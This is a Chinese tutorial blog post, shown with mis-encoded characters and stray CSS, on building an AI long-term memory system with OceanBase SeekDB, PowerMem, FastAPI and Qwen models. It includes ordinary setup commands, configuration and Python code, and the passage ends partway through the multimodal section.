h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ä¸ AI åº”ç”¨äº¤äº’æ—¶ï¼Œä½ æœ‰æ²¡æœ‰ç»å†è¿‡è¿™æ ·çš„åœºæ™¯ï¼šæ¯æ¬¡æ–°ä¼šè¯éƒ½è¦é‡æ–°ä»‹ç»è‡ªå·±æ˜¯è°ã€åœ¨åšä»€ä¹ˆé¡¹ç›®ï¼Œåˆšæ‰èŠè¿‡çš„åå¥½è½¬çœ¼å°±è¢«å¿˜å¾—ä¸€å¹²äºŒå‡€ï¼Ÿè¿™æ˜¯å› ä¸ºå¤§å¤šæ•°å¤§è¯­è¨€æ¨¡å‹æœ¬è´¨ä¸Šæ˜¯<strong>æ— çŠ¶æ€</strong>çš„â€”â€”æ¯ä¸€æ¬¡å¯¹è¯éƒ½æ˜¯ä»é›¶å¼€å§‹ï¼Œä¸Šä¸‹æ–‡çª—å£æœ‰é™ä¸”æ— æ³•æŒä¹…åŒ–ã€‚</p>
<p>å¦‚æœèƒ½è®© AI "è®°ä½"ç”¨æˆ·â€”â€”ä¸ä»…è®°ä½å½“å‰å¯¹è¯ï¼Œè¿˜èƒ½è®°ä½å†å²äº¤äº’ã€ä¸ªäººåå¥½å’Œç”¨æˆ·ç”»åƒâ€”â€”å®ƒå°±èƒ½æˆä¸ºçœŸæ­£æœ‰"æˆé•¿æ€§"çš„æ™ºèƒ½åŠ©æ‰‹ã€‚æœ¬æ–‡å°†ä»‹ç»å¦‚ä½•ä½¿ç”¨ OceanBase æ¨å‡ºçš„ <strong>SeekDB</strong>ï¼ˆAI åŸç”Ÿæ··åˆæœç´¢æ•°æ®åº“ï¼‰å’Œ <strong>PowerMem</strong>ï¼ˆæ™ºèƒ½è®°å¿†ç®¡ç†åº“ï¼‰æ„å»ºä¸€ä¸ªå¤šæ¨¡æ€æ™ºèƒ½è®°å¿†ç³»ç»Ÿ MemBoxï¼Œå®ç°ç”¨æˆ·è®°å¿†æŒä¹…åŒ–ã€è¯­ä¹‰æ£€ç´¢å’Œä¸ªæ€§åŒ–å›å¤ï¼Œè®© AI æ‹¥æœ‰è·¨ä¼šè¯çš„"é•¿æœŸè®°å¿†"ã€‚</p>
<h2 data-id="heading-0">1. SeekDB ä»‹ç»</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foceanbase%2Fseekdb" target="_blank" title="https://github.com/oceanbase/seekdb" ref="nofollow noopener noreferrer">seekdb</a> æ˜¯ OceanBase æ¨å‡ºçš„ AI åŸç”Ÿæ··åˆæœç´¢æ•°æ®åº“ï¼Œåœ¨ä¸€ä¸ªæ•°æ®åº“ä¸­èåˆå‘é‡ã€æ–‡æœ¬ã€ç»“æ„åŒ–ä¸åŠç»“æ„åŒ–æ•°æ®èƒ½åŠ›ï¼Œå¹¶é€šè¿‡å†…ç½® AI Functions æ”¯æŒå¤šæ¨¡æ··åˆæœç´¢ä¸æ™ºèƒ½æ¨ç†ã€‚</p>
<p>SeekDB çš„æ ¸å¿ƒç‰¹æ€§ï¼š</p>
<ul>
<li><strong>çµæ´»éƒ¨ç½²</strong>ï¼šæ”¯æŒåµŒå…¥å¼å’ŒæœåŠ¡å™¨ä¸¤ç§éƒ¨ç½²æ¨¡å¼ã€‚åµŒå…¥å¼æ¨¡å¼ä¸‹å¯å°† seekdb ç›´æ¥é›†æˆè¿› Python åº”ç”¨ï¼Œä¾¿äºè¿›è¡Œä¸ªäººå¼€å‘ã€‚</li>
<li><strong>æ··åˆæœç´¢</strong>ï¼šå‘é‡ã€å…¨æ–‡ä¸æ ‡é‡è¿‡æ»¤åœ¨ä¸€æ¬¡æŸ¥è¯¢ä¸­å®Œæˆï¼Œæ”¯æŒç²—æ’ + ç²¾æ’çš„å¤šé˜¶æ®µæœç´¢é“¾è·¯ã€‚</li>
<li><strong>å¤šæ¨¡æ•°æ®ä¸ç´¢å¼•</strong>ï¼šæ”¯æŒå‘é‡ã€æ–‡æœ¬ã€JSONã€GIS ç­‰å¤šæ¨¡æ•°æ®ï¼Œæä¾› HNSW/IVF å‘é‡ç´¢å¼•ã€BM25 å…¨æ–‡ç´¢å¼•ç­‰ã€‚</li>
<li><strong>AI å†…ç½®</strong>ï¼šåœ¨æ•°æ®åº“å†…å®Œæˆå‘é‡åµŒå…¥ã€æ¨ç†ã€æç¤ºè¯ç®¡ç†ä¸é‡æ’ï¼Œæ”¯æŒ document-in/data-out çš„å®Œæ•´ RAG æµç¨‹ã€‚</li>
<li><strong>SQL åŸç”Ÿ</strong>ï¼šæºäºæˆç†Ÿçš„ OceanBase å¼•æ“ï¼Œæ”¯æŒå®æ—¶å†™å…¥ã€å®æ—¶å¯æŸ¥ï¼ŒACID äº‹åŠ¡ä¿è¯ï¼Œå…¼å®¹ MySQL ç”Ÿæ€ã€‚</li>
<li><strong>ç»Ÿä¸€åº”ç”¨æ¥å£</strong>ï¼šé€‚é… LangChainã€LlamaIndexã€Dify ç­‰è¿‘ 30 ç§ AI æ¡†æ¶ï¼Œæä¾› MCP Serverã€‚</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d3372e88e3944c5a6b23c2ec8ca74ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2U3ZW4yNTg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523361&amp;x-signature=V%2B9K4%2BexQnejUiI%2BfvaI5xxA7E4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">2. PowerMem ä»‹ç»</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foceanbase%2Fpowermem" target="_blank" title="https://github.com/oceanbase/powermem" ref="nofollow noopener noreferrer">PowerMem</a> æ˜¯ä¸€ä¸ªæ™ºèƒ½è®°å¿†ç®¡ç†åº“ã€‚åœ¨ AI åº”ç”¨å¼€å‘ä¸­ï¼Œå¦‚ä½•è®©å¤§è¯­è¨€æ¨¡å‹æŒä¹…åŒ–åœ°"è®°ä½"å†å²å¯¹è¯ã€ç”¨æˆ·åå¥½å’Œä¸Šä¸‹æ–‡ä¿¡æ¯æ˜¯ä¸€ä¸ªæ ¸å¿ƒæŒ‘æˆ˜ã€‚PowerMem èåˆå‘é‡æ£€ç´¢ã€å…¨æ–‡æ£€ç´¢å’Œå›¾æ•°æ®åº“çš„æ··åˆå­˜å‚¨æ¶æ„ï¼Œä¸º AI åº”ç”¨æ„å»ºäº†å¼ºå¤§çš„è®°å¿†åŸºç¡€è®¾æ–½ã€‚</p>
<p>PowerMem çš„æ ¸å¿ƒç‰¹æ€§ï¼š</p>
<ul>
<li><strong>è½»é‡çº§æ¥å…¥</strong>ï¼šæä¾›ç®€æ´çš„ Python SDKï¼Œè¿˜æ”¯æŒ MCP Server å’Œ HTTP API Server æ¥å…¥ã€‚</li>
<li><strong>æ™ºèƒ½è®°å¿†æå–</strong>ï¼šé€šè¿‡ LLM è‡ªåŠ¨ä»å¯¹è¯ä¸­æå–å…³é”®äº‹å®ï¼Œæ™ºèƒ½æ£€æµ‹é‡å¤ã€æ›´æ–°å†²çªä¿¡æ¯å¹¶åˆå¹¶ç›¸å…³è®°å¿†ã€‚</li>
<li><strong>ç”¨æˆ·ç”»åƒ</strong>ï¼šè‡ªåŠ¨æ„å»ºå’Œæ›´æ–°ç”¨æˆ·ç”»åƒï¼Œè®© AI æ›´å¥½åœ°ç†è§£æ¯ä¸ªç”¨æˆ·ã€‚</li>
<li><strong>å¤šç”¨æˆ·/å¤šæ™ºèƒ½ä½“éš”ç¦»</strong>ï¼šä¸ºæ¯ä¸ªç”¨æˆ·æˆ–æ™ºèƒ½ä½“æä¾›ç‹¬ç«‹çš„è®°å¿†ç©ºé—´ï¼Œæ”¯æŒè·¨æ™ºèƒ½ä½“åä½œã€‚</li>
<li><strong>å¤šæ¨¡æ€æ”¯æŒ</strong>ï¼šæ”¯æŒæ–‡æœ¬ã€å›¾åƒã€è¯­éŸ³ç­‰å¤šæ¨¡æ€å†…å®¹çš„è®°å¿†å’Œæ£€ç´¢ã€‚</li>
<li><strong>æ··åˆæ£€ç´¢</strong>ï¼šèåˆå‘é‡æ£€ç´¢ã€å…¨æ–‡æœç´¢å’Œå›¾æ£€ç´¢çš„å¤šè·¯å¬å›èƒ½åŠ›ã€‚</li>
</ul>
<h2 data-id="heading-2">3. é¡¹ç›®æ•ˆæœé¢„è§ˆ</h2>
<p>æœ¬æ–‡å°†å¸¦ä½ ä½¿ç”¨ <strong>seekdb</strong> + <strong>PowerMem</strong> ä»é›¶æ„å»ºä¸€ä¸ªå¤šæ¨¡æ€æ™ºèƒ½è®°å¿†ç³»ç»Ÿ MemBoxã€‚MemBox å¯ä»¥è‡ªåŠ¨ä»å¯¹è¯ä¸­æå–å…³é”®ä¿¡æ¯ã€æ„å»ºç”¨æˆ·ç”»åƒã€ç†è§£å›¾ç‰‡å†…å®¹ï¼Œå¹¶åœ¨åç»­å¯¹è¯ä¸­æ™ºèƒ½æ£€ç´¢ç›¸å…³è®°å¿†ï¼Œæä¾›ä¸ªæ€§åŒ–å›ç­”ã€‚å…ˆæ¥çœ‹çœ‹æœ€ç»ˆæ•ˆæœï¼š</p>
<p/>
<h2 data-id="heading-3">4. å‡†å¤‡å·¥ä½œ</h2>
<h3 data-id="heading-4">4.1 ç¯å¢ƒè¦æ±‚</h3>
<ul>
<li>Docker å’Œ Docker Composeï¼ˆè¿è¡Œ seekdbï¼‰</li>
<li>Node.js 20+ï¼ˆå‰ç«¯ï¼‰</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fpnpm.io%2F" target="_blank" title="https://pnpm.io/" ref="nofollow noopener noreferrer">pnpm</a>ï¼ˆå‰ç«¯åŒ…ç®¡ç†ï¼‰</li>
<li>Python 3.11+ï¼ˆåç«¯ï¼‰</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.astral.sh%2Fuv%2F" target="_blank" title="https://docs.astral.sh/uv/" ref="nofollow noopener noreferrer">uv</a>ï¼ˆPython åŒ…ç®¡ç†ï¼‰</li>
</ul>
<h3 data-id="heading-5">4.2 è·å– API Key</h3>
<p>æœ¬é¡¹ç›®ä½¿ç”¨é˜¿é‡Œäº‘é€šä¹‰åƒé—®æ¨¡å‹ï¼Œéœ€è¦è·å–é˜¿é‡Œäº‘ç™¾ç‚¼çš„ API Keyï¼š</p>
<ol>
<li>è®¿é—®<a href="https://link.juejin.cn?target=https%3A%2F%2Fbailian.console.aliyun.com%2Fcn-beijing%2F%3FapiKey%3D1%23%2Fapi-key" target="_blank" title="https://bailian.console.aliyun.com/cn-beijing/?apiKey=1#/api-key" ref="nofollow noopener noreferrer">é˜¿é‡Œäº‘ç™¾ç‚¼æ§åˆ¶å°</a>ã€‚</li>
<li>å¼€é€šæœåŠ¡å¹¶åˆ›å»º API Keyã€‚</li>
</ol>
<h3 data-id="heading-6">4.3 å¯åŠ¨ SeekDB</h3>
<p>ä½¿ç”¨ Docker å¿«é€Ÿå¯åŠ¨ seekdbï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
  --name seekdb \
  -p 2881:2881 \
  -v seekdb_data:/var/lib/oceanbase \
  oceanbase/seekdb:1.0.1.0-100000392025122619
</code></pre>
<h3 data-id="heading-7">4.4 ç¯å¢ƒå˜é‡è®¾ç½®</h3>
<p>æœ¬é¡¹ç›®éœ€è¦é…ç½®ç¯å¢ƒå˜é‡ï¼Œå¯å‚è€ƒ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcr7258%2Fmembox%2Fblob%2Fmain%2F.env.example" target="_blank" title="https://github.com/cr7258/membox/blob/main/.env.example" ref="nofollow noopener noreferrer">.env.example</a> æ–‡ä»¶ï¼Œå°†å…¶å¤åˆ¶ä¸º <code>.env</code> å¹¶å¡«å…¥ç›¸åº”å€¼ã€‚å…¶ä¸­åªéœ€é…ç½® <code>DASHSCOPE_API_KEY</code> ç”¨äºè°ƒç”¨åƒé—®å¤§æ¨¡å‹ï¼Œå…¶ä»–å˜é‡å¯ä¿æŒé»˜è®¤ã€‚</p>
<h2 data-id="heading-8">5. æ•´ä½“æ¶æ„</h2>
<p>å½“ç”¨æˆ·ä¸ MemBox å¯¹è¯æ—¶ï¼Œå®Œæ•´çš„è¯·æ±‚æµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li><strong>ç”¨æˆ·è¾“å…¥</strong>ï¼šç”¨æˆ·åœ¨å‰ç«¯å‘é€æ¶ˆæ¯ï¼ˆå¯åŒ…å«æ–‡å­—å’Œå›¾ç‰‡ï¼‰ã€‚</li>
<li><strong>è®°å¿†æ£€ç´¢</strong>ï¼šå‰ç«¯è°ƒç”¨åç«¯æœç´¢ç›¸å…³è®°å¿†ã€‚</li>
<li><strong>å‘é‡æœç´¢</strong>ï¼šåç«¯ä½¿ç”¨ PowerMem å°†æŸ¥è¯¢é€šè¿‡ text-embedding-v4 æ¨¡å‹è½¬æ¢ä¸ºå‘é‡ï¼Œåœ¨ seekdb ä¸­è¿›è¡Œç›¸ä¼¼åº¦æœç´¢ã€‚</li>
<li><strong>è¿”å›ç»“æœ</strong>ï¼šseekdb è¿”å›ç›¸å…³è®°å¿†å’Œç”¨æˆ·ç”»åƒã€‚</li>
<li><strong>ä¸Šä¸‹æ–‡æ³¨å…¥</strong>ï¼šå‰ç«¯å°†è®°å¿†ä¸Šä¸‹æ–‡æ³¨å…¥ LLM çš„ System Promptã€‚</li>
<li><strong>ç”Ÿæˆå›ç­”</strong>ï¼šå‰ç«¯è°ƒç”¨ qwen-plus æ¨¡å‹ç”Ÿæˆå›ç­”ï¼Œå¦‚æœ‰å›¾ç‰‡åˆ™ä½¿ç”¨å¤šæ¨¡æ€æ¨¡å‹ qwen-vl-plus æ¨¡å‹ç†è§£å›¾ç‰‡å†…å®¹ã€‚</li>
<li><strong>è¿”å›å“åº”</strong>ï¼šLLM å°†å›ç­”è¿”å›ç»™ç”¨æˆ·ã€‚</li>
<li><strong>è®°å¿†å­˜å‚¨</strong>ï¼šå¯¹è¯ç»“æŸåï¼ŒPowerMem æå–æ–°çš„äº‹å®ä¿¡æ¯ï¼Œé€šè¿‡ text-embedding-v4 å‘é‡åŒ–åå­˜å…¥ seekdbã€‚</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42eee5b732d74a14a4ecae6ef8d66c48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2U3ZW4yNTg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523361&amp;x-signature=Fsx5cMijoiFIEUF5lF4fFbPNwNw%3D" alt="" loading="lazy"/></p>
<p>æœ¬æ–‡çš„å®Œæ•´ä»£ç å¯ä»¥åœ¨ Github ä¸Šæ‰¾åˆ°ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcr7258%2Fmembox" target="_blank" title="https://github.com/cr7258/membox" ref="nofollow noopener noreferrer">github.com/cr7258/membâ€¦</a></p>
<h2 data-id="heading-9">6. æ­å»ºåç«¯ï¼ˆFastAPI + PowerMemï¼‰</h2>
<h3 data-id="heading-10">6.1 é…ç½® PowerMem</h3>
<p>PowerMem æ”¯æŒä¸¤ç§é…ç½®æ–¹å¼ï¼š</p>
<ol>
<li><strong>ç¯å¢ƒå˜é‡ï¼ˆ<code>.env</code> æ–‡ä»¶ï¼‰</strong>ï¼šé€‚åˆå¤§å¤šæ•°åœºæ™¯ï¼ŒPowerMem ä¼šè‡ªåŠ¨åŠ è½½ã€‚</li>
<li><strong>JSON/ Python å­—å…¸é…ç½®</strong>ï¼šé€‚åˆåœ¨ä»£ç ä¸­çµæ´»ç®¡ç†é…ç½®çš„åœºæ™¯ã€‚</li>
</ol>
<p>æœ¬é¡¹ç›®ä½¿ç”¨ JSON/Python å­—å…¸é…ç½®æ–¹å¼ï¼Œ<code>config.py</code> é…ç½®å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-python" lang="python">config = {
    <span class="hljs-comment"># LLM é…ç½® - ç”¨äºæ™ºèƒ½è®°å¿†æå–å’Œç”¨æˆ·ç”»åƒ</span>
    <span class="hljs-string">"llm"</span>: {
        <span class="hljs-string">"provider"</span>: <span class="hljs-string">"qwen"</span>,
        <span class="hljs-string">"config"</span>: {
            <span class="hljs-string">"model"</span>: os.getenv(<span class="hljs-string">"LLM_MODEL"</span>, <span class="hljs-string">"qwen-plus"</span>),
            <span class="hljs-string">"api_key"</span>: os.getenv(<span class="hljs-string">"DASHSCOPE_API_KEY"</span>),
        }
    },
    
    <span class="hljs-comment"># Embedding é…ç½® - ç”¨äºå‘é‡åŒ–</span>
    <span class="hljs-string">"embedder"</span>: {
        <span class="hljs-string">"provider"</span>: <span class="hljs-string">"qwen"</span>,
        <span class="hljs-string">"config"</span>: {
            <span class="hljs-string">"model"</span>: os.getenv(<span class="hljs-string">"EMBEDDING_MODEL"</span>, <span class="hljs-string">"text-embedding-v4"</span>),
            <span class="hljs-string">"embedding_dims"</span>: <span class="hljs-built_in">int</span>(os.getenv(<span class="hljs-string">"EMBEDDING_DIMS"</span>, <span class="hljs-string">"1536"</span>)),
            <span class="hljs-string">"api_key"</span>: os.getenv(<span class="hljs-string">"DASHSCOPE_API_KEY"</span>),
        }
    },
    
    <span class="hljs-comment"># å‘é‡å­˜å‚¨é…ç½® - SeekDB (OceanBase)</span>
    <span class="hljs-string">"vector_store"</span>: {
        <span class="hljs-string">"provider"</span>: <span class="hljs-string">"oceanbase"</span>,
        <span class="hljs-string">"config"</span>: {
            <span class="hljs-string">"collection_name"</span>: <span class="hljs-string">"memories"</span>,
            <span class="hljs-string">"embedding_model_dims"</span>: <span class="hljs-built_in">int</span>(os.getenv(<span class="hljs-string">"EMBEDDING_DIMS"</span>, <span class="hljs-string">"1536"</span>)),
            <span class="hljs-string">"host"</span>: os.getenv(<span class="hljs-string">"OCEANBASE_HOST"</span>, <span class="hljs-string">"127.0.0.1"</span>),
            <span class="hljs-string">"port"</span>: <span class="hljs-built_in">int</span>(os.getenv(<span class="hljs-string">"OCEANBASE_PORT"</span>, <span class="hljs-string">"2881"</span>)),
            <span class="hljs-string">"user"</span>: os.getenv(<span class="hljs-string">"OCEANBASE_USER"</span>, <span class="hljs-string">"root@sys"</span>),
            <span class="hljs-string">"password"</span>: os.getenv(<span class="hljs-string">"OCEANBASE_PASSWORD"</span>, <span class="hljs-string">""</span>),
            <span class="hljs-string">"db_name"</span>: os.getenv(<span class="hljs-string">"OCEANBASE_DATABASE"</span>, <span class="hljs-string">"membox"</span>),
        }
    },
}
</code></pre>
<h3 data-id="heading-11">6.2 è®°å¿†ç®¡ç†</h3>
<p><code>memory_manager.py</code> å°è£…äº† PowerMem çš„æ ¸å¿ƒæ“ä½œï¼Œä¸»è¦åŒ…å«ä¸¤ä¸ªæ–¹æ³•ï¼š</p>
<ul>
<li><strong>add_memory</strong>ï¼šä»å¯¹è¯ä¸­æå–å¹¶ä¿å­˜è®°å¿†ã€‚é€šè¿‡ <code>infer=True</code> å¯ç”¨æ™ºèƒ½æå–ï¼ŒPowerMem ä¼šè‡ªåŠ¨ä»å¯¹è¯ä¸­æå–äº‹å®ä¿¡æ¯ã€å»é‡ã€æ›´æ–°å†²çªå†…å®¹å¹¶æ•´åˆç›¸å…³è®°å¿†ã€‚é€šè¿‡ <code>user_id</code> å®ç°ç”¨æˆ·éš”ç¦»ï¼Œæ¯ä¸ªç”¨æˆ·çš„è®°å¿†ç‹¬ç«‹å­˜å‚¨ã€‚</li>
<li><strong>search_memory</strong>ï¼šæœç´¢ä¸æŸ¥è¯¢ç›¸å…³çš„è®°å¿†ã€‚é€šè¿‡ <code>add_profile=True</code> åœ¨è¿”å›ç»“æœä¸­åŒ…å«ç”¨æˆ·ç”»åƒï¼Œå¸®åŠ© LLM ç”Ÿæˆæ›´ä¸ªæ€§åŒ–çš„å›å¤ã€‚æœç´¢æ—¶ä¼šæ ¹æ® <code>user_id</code> è¿‡æ»¤ï¼Œåªè¿”å›å½“å‰ç”¨æˆ·çš„è®°å¿†ã€‚</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> powermem <span class="hljs-keyword">import</span> UserMemory
<span class="hljs-keyword">from</span> .config <span class="hljs-keyword">import</span> config

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryManager</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.memory = UserMemory(config=config)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_memory</span>(<span class="hljs-params">self, messages: <span class="hljs-built_in">list</span>, user_id: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
        <span class="hljs-string">"""ä»å¯¹è¯ä¸­æå–å¹¶ä¿å­˜è®°å¿†"""</span>
        result = self.memory.add(
            messages=messages,
            user_id=user_id,
            infer=<span class="hljs-literal">True</span>  <span class="hljs-comment"># å¯ç”¨æ™ºèƒ½æå–</span>
        )
        <span class="hljs-keyword">return</span> result
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">search_memory</span>(<span class="hljs-params">self, query: <span class="hljs-built_in">str</span>, user_id: <span class="hljs-built_in">str</span>, limit: <span class="hljs-built_in">int</span> = <span class="hljs-number">5</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
        <span class="hljs-string">"""æœç´¢ç›¸å…³è®°å¿†"""</span>
        results = self.memory.search(
            query=query,
            user_id=user_id,
            limit=limit,
            add_profile=<span class="hljs-literal">True</span>  <span class="hljs-comment"># åŒæ—¶è¿”å›ç”¨æˆ·ç”»åƒ</span>
        )
        <span class="hljs-keyword">return</span> results
</code></pre>
<h3 data-id="heading-12">6.3 å®ç° API è·¯ç”±</h3>
<p><code>routes/memory.py</code> æä¾›è®°å¿†ç›¸å…³çš„ RESTful APIï¼Œä¾›å‰ç«¯è°ƒç”¨ï¼š</p>
<ul>
<li><strong>POST /api/memory/add</strong>ï¼šå‰ç«¯åœ¨å¯¹è¯ç»“æŸåè°ƒç”¨ï¼Œå°†ç”¨æˆ·å’Œ AI çš„å¯¹è¯å†…å®¹å‘é€åˆ°åç«¯è¿›è¡Œè®°å¿†æå–å’Œå­˜å‚¨ã€‚</li>
<li><strong>POST /api/memory/search</strong>ï¼šå‰ç«¯åœ¨ç”¨æˆ·å‘é€æ–°æ¶ˆæ¯å‰è°ƒç”¨ï¼Œæœç´¢ç›¸å…³è®°å¿†å’Œç”¨æˆ·ç”»åƒï¼Œæ³¨å…¥åˆ° LLM çš„ç³»ç»Ÿæç¤ºè¯ä¸­ã€‚</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> APIRouter, HTTPException
<span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel
<span class="hljs-keyword">from</span> ..memory_manager <span class="hljs-keyword">import</span> get_memory_manager

router = APIRouter()

<span class="hljs-keyword">class</span> <span class="hljs-title class_">AddMemoryRequest</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    messages: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]
    user_id: <span class="hljs-built_in">str</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SearchMemoryRequest</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    query: <span class="hljs-built_in">str</span>
    user_id: <span class="hljs-built_in">str</span>
    limit: <span class="hljs-built_in">int</span> = <span class="hljs-number">5</span>

<span class="hljs-meta">@router.post(<span class="hljs-params"><span class="hljs-string">"/add"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_memory</span>(<span class="hljs-params">request: AddMemoryRequest</span>):
    <span class="hljs-string">"""æ·»åŠ è®°å¿†"""</span>
    mm = get_memory_manager()
    result = mm.add_memory(
        messages=request.messages,
        user_id=request.user_id
    )
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"success"</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">"result"</span>: result}

<span class="hljs-meta">@router.post(<span class="hljs-params"><span class="hljs-string">"/search"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">search_memory</span>(<span class="hljs-params">request: SearchMemoryRequest</span>):
    <span class="hljs-string">"""æœç´¢è®°å¿†"""</span>
    mm = get_memory_manager()
    results = mm.search_memory(
        query=request.query,
        user_id=request.user_id,
        limit=request.limit
    )
    <span class="hljs-keyword">return</span> results
</code></pre>
<h2 data-id="heading-13">7. æ·»åŠ å¤šæ¨¡æ€æ”¯æŒ</h2>
<p>MemBox æ”¯æŒå›¾ç‰‡ç†è§£åŠŸèƒ½ï¼Œç”¨æˆ·å¯ä»¥ä¸Šä¼ å›¾ç‰‡å¹¶æé—®ã€‚æ•´ä½“æµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li><strong>å›¾ç‰‡ä¸Šä¼ </strong>ï¼šç”¨æˆ·é€‰æ‹©å›¾ç‰‡ï¼Œå‰ç«¯ä¸Šä¼ åˆ°åç«¯è·å– URLï¼Œç”¨äºåœ¨èŠå¤©å†å²è®°å½•ä¸­æ˜¾ç¤ºå›¾ç‰‡é¢„è§ˆã€‚</li>
<li><strong>å›¾ç‰‡ç†è§£</strong>ï¼šå‰ç«¯å°†å›¾ç‰‡ URL ä¼ ç»™ Vercel AI SDKï¼ŒSDK è‡ªåŠ¨ä¸‹è½½å›¾ç‰‡å¹¶è½¬æˆ base64 å‘é€ç»™ qwen-vl-plusã€‚</li>
<li><strong>è®°å¿†ä¿å­˜</strong>ï¼šLLM çš„å›å¤ï¼ˆåŒ…å«å¯¹å›¾ç‰‡çš„ç†è§£æè¿°ï¼‰ä½œä¸ºæ–‡æœ¬ä¿å­˜åˆ° PowerMem ä¸­ã€‚</li>
</ol>
<p>è¿™æ ·åšçš„å¥½å¤„æ˜¯åç«¯åªéœ€æä¾›ç®€å•çš„å›¾ç‰‡å­˜å‚¨æœåŠ¡ï¼Œå¤šæ¨¡æ€ç†è§£ç”± Vercel AI SDK å’Œå‰ç«¯ç»Ÿä¸€å¤„ç†ã€‚</p>
<blockquote>
